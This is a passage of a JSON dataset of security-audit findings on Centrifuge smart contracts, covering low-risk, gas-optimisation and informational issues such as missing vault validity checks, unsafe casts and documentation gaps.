        "body": "Function getTranchePrice() can return a price of 0, if it is queried before the first updateTrancheP- rice()is done. This would give incorrect results in convertToShares() and convertToAssets().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Tranche tokens of a frozen account may be burned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "A user whose account has been frozen can still have their tranche tokens burned. This is inconsistent with the mint function, which prohibits frozen users from minting. As burning can be considered a transfer to the zero address, a frozen account should not be able to perform this action. This behavior may violate regulations in some jurisdictions. If an account is frozen for regulatory reasons, burning tokens might be prohibited, similar to how some stablecoins (e.g., USDC) disallow burning of tokens by users on their deny list.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Vault address is not verified to be valid in InvestmentManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The vault address is not verified to be valid in the following functions: fulfillDepositRequest(), fulfillRedeemRequest, fulfillCancelDepositRequest(), fulfillCancelRedeemRequest(), triggerRedeem- Request(). The vault could have been removed or recreated. Note: getVault() doesn't check the validity of the vault.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrap / Unwrap revert on zero amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The wrap() and unwrap() functions revert if the amount is zero. Normally users would not call these functions with a zero amount, and the same goes for openLockDepositRequest() and claimRedeem(). However in an automated flow (for example in combination with multicall()), this could happen. And then there is no reason to revert on a zero amount. For reference:  Morpho ERC20WrapperBundler does revert on zero amounts.  OZ ERC20Wrapper does not revert on zero amounts.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_handleRecovery() can be done repeatedly by one adapter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "A single adapter can trigger _handleRecovery() due to the lack of quorum checks. If this adapter is malicious, it could repeatedly call to DisputeMessageRecovery().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unsafe cast of addresses.length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The code truncates the address.length to uint8. If addresses.length were 257, this would result in 1. However, the entire addresses array is assigned to adapters later (see Gateway.sol#L92). Afterward, in functions like send(), the full adapters.length is used.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gateway could call handle() in its own contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The Gateway contract itself contains a handle() function that could potentially be called, allowing for an additional layer of recursion. This scenario is only possible if the Gateway address is added to the messageHan- dlers[] array through the file() function.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some functions of CentrifugeRouter don't check vault validity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Several functions of CentrifugeRouter don't explicitly check that the vault is valid, so they could accidentally interact with an old or invalid vault. Other functions use poolManager.getVaultAsset(vault), which checks the vault is valid. The impact seems to be limited.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In transit funds inaccessible after removing a vault or contract updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "When calling removeVault(), there could still be funds in transit, while being stored in one of the escrows. The administration is kept in lockedRequests[][] and investments[][]. unlockDepositRequest() and executeLockedDepositRequest() will fail at getVaultAsset() when trying to access these funds. The old vault can no longer access functions from the investmentManager. A similar issue occurs if poolManager or Gateway are upgraded. Then CentrifugeRouter will not function anymore and has to be replaced. Any funds still in transit are difficult to access. The funds can be recovered from escrow by Centrifuge governance through a spell that could get approval to transfer locked funds from the escrow contract and distribute them back to the user. Although function removeVault() and contract upgrades are authorised there are likely always funds in transit trough the protocol. 18",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Very low number of minimal decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The value for MIN_DECIMALS is set to 1, but the lowest real-life example has 2 decimals, as we can see in weird-erc20. Having a lower MIN_DECIMALS typically makes rounding errors more severe.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function checkERC20Transfer() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The function checkERC20Transfer() can be optimized to save some gas.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "transfer() of TransferProxy doesn't need to specify amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The function transfer() of TransferProxy allows specifying an amount that is larger than the available assets. This will result in a revert in poolManager.transferAssets() and thus wastes gas. There doesn't seem to be a need to be able to specify the amount.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "getLSBits() and getMSBits() can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The functions getLSBits() and getMSBits() are only used with 128 bits so these functions can be simplified to use less gas. Additonally getLSBits() and getMSBits() can then return an uint128 which saves a typecast.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "shares.toUint128() done multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The shares.toUint128() conversion is performed multiple times. A small amount of gas might be saved by storing the result in a variable.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant check in _handleRecovery()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The msg.sender check in _handleRecovery() is redundant with the check on the first line of _- handle() which is the only place _handleRecovery() is called from.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "For loops could be shorter in ArrayLib",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The functions in ArrayLib only have to loop through adapters.length elements, because that it the number of elements that is in use.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "msg.sender == _initiator() in functions with modifier protected()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The modifier protected() enforces that msg.sender == _initiator(). So within functions that have this modifier, msg.sender could be used instead of _initiator(). That would save some gas.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Array lenghts in for loops can be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Caching array lengths: ....length could save some gas, especially in for loops.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "TransferProxy could be deployed with create2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "TransferProxy could be deployed with CREATE2. The advantage is that the address can be determined before deployment and that the address will be the same on all chains.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "disallowAsset() doesn't fully block the use of an asset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Function disallowAsset() doesn't disable the vaults that use this asset. The functions request- Deposit() and requestRedeem() do check isAllowedAsset(). However in further stages this check isn't done anymore. This could lead to using assets that are not longer supported. This could potentially violate strict invariant checks.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational InvestmentManager.sol#L493-L516,"
        ]
    },
    {
        "title": "The check for supportsInterface() can allow non compliant hooks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The check for supportsInterface() can return true even it the hook doesn't support ERC165. For example if it has a fallback function that returns true on every function call.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi.encodeWithSelector() can be replaced with abi.encodeCall()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "In several places abi.encodeWithSelector() is used. However abi.encodeCall() would be safer because it also checks for the correct types. See the Solidity manual.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo in ICentrifugeRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "A comment for multicall() contains a typo.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing function interfaces",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "For several public variables there is no function interface defined in the interface files.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Parameters of fulfillCancelDepositRequest() not clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "It is not clear what the difference is between assets and fulfillment in fulfillCancelDepositRe- quest(). The project explained: It is mainly for precision loss. There can be multiple steps in between on Centrifuge Chain. So basically assets is the rounded down option, that the user actually gets, and fulfillment is the rounded up version, that we decrease pendingDepositRequest by (which we need to ensure goes to 0 at the end).",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the internal function _maxDeposit() instead of the external function maxDeposit()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The maxDeposit() function is used instead of _maxDeposit() function.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "It's unnecessary to use abi.encodePacked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "There's no need to use encodePacked . Instead, you could simply use uint128(hookData.to) >> 64.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add balance check in lockDepositRequest function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The functions requestDeposit() and requestRedeem() in ERC7540Vault verify the available bal- ance before transferring tokens. However, lockDepositRequest() lacks this balance check.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Revert when signer is zero address in isValidSignature function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "In case the signer is zero address, all invalid signatures are allowed. While permit() and autho- rizeOperator() -- the functions that call isValidSignature() -- check for this, it's safer to implement the check here as well. This precaution ensures security if the function is used differently in the future.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused imports",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "There are unused imports in:  Axelar.s.sol script: ERC20 and AxelarForwarder.  Deployer.sol script: MockSafe.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace hardcoded values for id with constants in MessagesLib",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The id values in _dispatch() are equivalent to the values of enum Call in MessagesLib. Using these enum values instead of hardcoded numbers would prevent errors when new values are added and improve code readability.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent event parameters in _handle() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "All other event emissions in this function use adapter_, but this one uses msg.sender. Since _han- dle() is called via handle(), where adapter_ == msg.sender, the result is the same. However, this inconsistency in variable usage may cause confusion.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Send unused gas from QUOTA_SLOT back to the user",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "All refunds end up in the gateway, both from the pay/refund parameters and unused gas registered in QUOTA_SLOT. The gas from QUOTA_SLOT may be sent back to the original msg.sender",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions onERC20Transfer() and onERC20AuthTransfer() calculate the selector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The functions onERC20Transfer() and onERC20AuthTransfer() calculate the selector, which is error prone. The selectorcan also be retrieved via Solidity. The comment for onERC20AuthTransfer() in IHook is most likely incorrect.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Initializing with 0 isn't necessary if the variable is also defined in the for loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Some for loops define and then initialize the loop variable with 0, while others don't, which is inconsistent. Initializing with 0 isn't necessary if the variable is also defined in the for loop.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "shouldRefuel() case in send() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The currentAdapter returns any excess gas to address(this). If this amount would be larger than 0, then the next adapter could use this.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Different order for TYPEHASH parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The AUTHORIZE_OPERATOR_TYPEHASH for authorizeOperator() has deadline first and then nonce. The PERMIT_TYPEHASH for ERC20 permit() has nonce first and then deadline. The standard eip-712 doesn't specify an order so both orders should be valid.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable name manager is confusing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "When reading the code of ERC7540Vault it is not obvious that manager refers to InvestmentManager and not to PoolManager.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment about non-transferable is not clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The comment about non-transferable is not clear. More information about the background can be found in EIP-7540.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "BytesLibcan be replaced with pure Solidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The library BytesLib is used, which uses a lot of assembly. Most of the functionality can be replaced with pure Solidity which improves readability and maintainability. If the bytes array is calldata, then the Solidity slices [a..b] can be used, see array-slices. Most of the use of these functions indeed use calldata. Additionally the EVM now has mcopy, so maybe a better implementation can be made for slice, see EIP-5656. Proof of concept: This proof of concept, that can be run in Remix, shows the approach: // SPDX-License-Identifier: none pragma solidity 0.8.25; import \"hardhat/console.sol\"; contract convert { function handle(bytes calldata message) public pure { console.log(uint8(bytes1(message[0:1]))); console.log(uint16(bytes2(message[0:2]))); console.log(uint64(bytes8(message[0:8]))); console.log(uint128(bytes16(message[0:16]))); console.log(uint256(bytes32(message[0:32]))); console.logAddress(address(bytes20(message[0:20]))); console.log(string(message[0:128])); // fixed lenght string console.log(string(message[128:])); // remaining data used as string } function test() public view { bytes memory m = \"12345678901234567890123456789012345678901234567890123456789012345678901234567 c ,! 890123456789012345678901234567890123456789012345678901234567890\"; convert(this).handle(m); // external call to get calldata } }",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deadlines",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Currently there is no expiration on deposit orders which increases the centralization risk and may lead to long wait times for users. The complex nature of the system involves many cross-chain and offchain components, when any of these fail it could also affect the time user funds are held in escrow and in some extreme cases may result in loss of funds. Implementing an expiration system would not only reduce the centralization risk but also may increase adoption. Additionally, by giving a user the ability to claim tokens related to expired requests, it reduces overall gas and transaction costs incurred by the protocol.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "triggerRedeemRequest risks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "triggerRedeemRequest is only intended to be called in emergencies when directed to do so by jurisdictional authorities. It increases the centralization risk and accidental use of this function by an admin could create user dissatisifaction. Furthermore, it is not clear if a failed DAO vote would prevent this function from being called which may violate the directions of jurisdictional authorities and put the protocol at risk.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Slippage guard",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Due to the asynchronous nature of the Centrifuge system, it may be worth considering the addition of a slippage guard mechanism to the workflow. There could be a significant change in the price of the RWA during the processing of the off-chain components which would result in a price much different than a user was expecting. Even when Centrifuge was being perfectly fair, having a slippage guard in place can help remove the perception of unfair dealing. Slippage protection reduces the centralization risk of the protocol and may help increase adoption.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Gateway design",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Several design decisions around the Gateway contract were made in consideration of future changes to the system configuration. For example, initially there will only be one adapter but the system is built for the possibility of using multiple adapters. The current implementation includes logic for processing multiple adapters in addition to \"shortcuts\" added in for the intended initial rollout of one single adapter. if (adapter.quorum == 1 && !isMessageProof) { Storage for an array of adapters has been added and there is also an entire quorum feature built out in an attempt to support the eventuality of multiple adapters. However, due to the plans to initially require 100% quorum on all adapters, the quorum logic is disabled through hardcoded logic. The current code includes references to system features (such as quorum): if (state.votes.countNonZeroValues() >= adapter.quorum) { But this type of logic is technically not feasible due to a hardcoded contraint which ensures the quorum will always be 100%: uint8 quorum_ = uint8(addresses.length); When possible over-engineering should be avoided as it can result in unneeded complexity and security vulner- abilities such as the issue \"Updating set of active adapters does not always clear votes\". There also may be additional vulnerabilities that were not uncovered during this review that stem from the implementation of features not currently enabled due as a result of hardcoded logic. It may be worth considering using a simpler implementation now that addresses the project's needs. In the future, if the plan features are decided to be enabled, the contract will have to be updated to remove hardcoded logic anyways and can implement the additional complexity required at that time.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "setOperator() incomplete documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "IERC7540Operator doesn't document the return variable of setOperator().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multicall could use _initiator()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The function Multicall() directly uses INITIATOR_SLOT.tloadAddress(), while other functions use _initiator() (for example modifier protected()). Concentrating all access via the same functions improves consistency, readability and maintainability.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary typecasts in concat",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The variables left and right are already uint128 so a typecast to uint128 isn't necessary. Read- ability can be improved by removing these.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Some Solidity files have a difference licence",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Most files have the licence AGPL-3.0-only with the exception of: interfaces\\token\\IHook.sol 1:// SPDX-License-Identifier: MIT 1:// SPDX-License-Identifier: MIT interfaces\\IERC20.sol",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Some functions use revert() without error message",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Some functions use revert() without an error message. This might make troubleshooing errors more difficult.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "String based errors used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The use of custom errors can save gas, allow for custom parameters and makes it easier for inte- grating projects to detect the errors.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Hardcoded values used in Auth.sol and Root.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Auth.sol and Root.sol use values 0 and 1, which are not obvious.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Events are emitted when state hasn't changed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Events are emitted when state has not been changed by the following functions:  rely  deny  endorse  veto  pause  setEndorsedOperator  setOperator  setOperator  allowAsset 33  disallowAsset",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of variable name tranches in Gateway is confusing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The use of the variable name tranches in Gateway is confusing. These tranches are unrelated to Tranche.sol/tranchetoken which could lead to confusion.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "updateRestriction() could try to call non existing hook",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Function updateRestriction() doesn't check hook != address(0). the call would revert without a clear error message. If the hook would be 0 then",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rigorous reentrancy protection in an adapter could block triggerRedeemRequest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "If an adapter has a rigorous reentrancy protection, it might not be possible to send a message from an handle(), because it has to reenter in the adapter.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "No vault level emit for triggerRedeemRequest()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "There is no emit on the vault level for triggerRedeemRequest(). A dapp reading the event might not be able to interpret the poolId / trancheId from: emit TriggerRedeemRequest(poolId, trancheId, user, poolManager.idToAsset(assetId), shares);",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lacking function parameter documentation in IInvestmentManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "IInvestmentManager doesn't fully document the parameters of all the functions. This is especially important for fulfillCancelDepositRequest() because it has different parameters than the other functions.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Could prevent transfer of 0 assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The functions claimCancelDepositRequest() and claimCancelRedeemRequest() don't check if the amount is zero before transferring the tokens.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "transferFrom vs. safeTransferFrom",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "ERC7540Vault.requestRedeem() ager.claimCancelRedeemRequest(). It's a best practice to use safeTransferFrom instead of transferFrom . , InvestimentManager._processDeposit(), The functions InvestimentMan-",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add sanity checks in PoolManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Sanity checks are inconsistently applied throughout the various functions called by handle() in the PoolManager contract. It is difficult to predict all of the potential side-effects for all of the edge cases the checks could prevent. For example, if the value of a key were set to the zero address, this may result in the ability to set the zero address as a legitimate value in another mapping which may create a security vulnerability. The fact that the calls to handle are a result of multiple messages between chains which trigger additional off-chain components, the chance of these type of issues is increased.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment in fulfillDepositRequest() is incorrect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "A comment in functionfulfillDepositRequest() is incorrect.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deposit() can't be done with the exact same amount as DepositRequest()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "After requestDeposit() you can't use the exact amount of assets to call deposit(). This is due to rounding errors in both ERC7540Vault and the Centrifuge chain. Also deposit(maxDeposit(controller), receiver) leaves some shares behind due to rounding errors.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important that MAX_DECIMALS <= PRICE_DECIMALS",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "It is important that MAX_DECIMALS is always lower than or equal to PRICE_DECIMALS.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Usage of hardcoded value 8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The ArrayLib library only supports a MAX_ADAPTER_COUNT of exactly 8. If this constant changes, the library will break. To prevent this, and increase maintainability the hardcoded number 8 in the functions should be replaced with MAX_ADAPTER_COUNT.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Could use safeTransferETH()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Is a best practice to use safeTransferETH() instead of using transfer().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "MAX_ADAPTER_COUNT defined twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The MAX_ADAPTER_COUNT constant is defined in both Gateway and in IGateway.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "No sanity checks on message length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The code of _dispatch() to handle batch messages doesn't check if the length value, obtained from message.toUint16(offset), matches the actual length of the message. A check can be added as a safety precaution. Without it, the code might encounter an out-of-bounds error when accessing message[].",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
